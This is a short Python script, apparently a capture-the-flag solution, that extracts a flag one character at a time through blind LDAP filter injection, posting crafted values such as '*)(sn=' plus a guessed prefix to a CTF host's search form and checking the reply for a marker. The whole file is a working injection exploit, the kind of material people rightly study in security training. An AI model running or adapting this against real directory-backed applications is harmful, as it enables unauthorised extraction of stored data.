import requests
from string import ascii_letters


def flag_guesser():
    base_string = "URJC{"
    url = "https://r3-ctf-vulnerable.numa.host/search"
    characters = ascii_letters + '}' + '_' + '-'
    while not base_string.endswith("}"):
        for next_char in characters:
            injection_value = "*)(sn=" + base_string + next_char + "*"
            post_request = requests.post(url, data={'name': injection_value})
            if post_request.text.__contains__("FlaggyMacFlag"):
                base_string += next_char
                print(base_string)
                break

    print(base_string)


if __name__ == '__main__':
    flag_guesser()
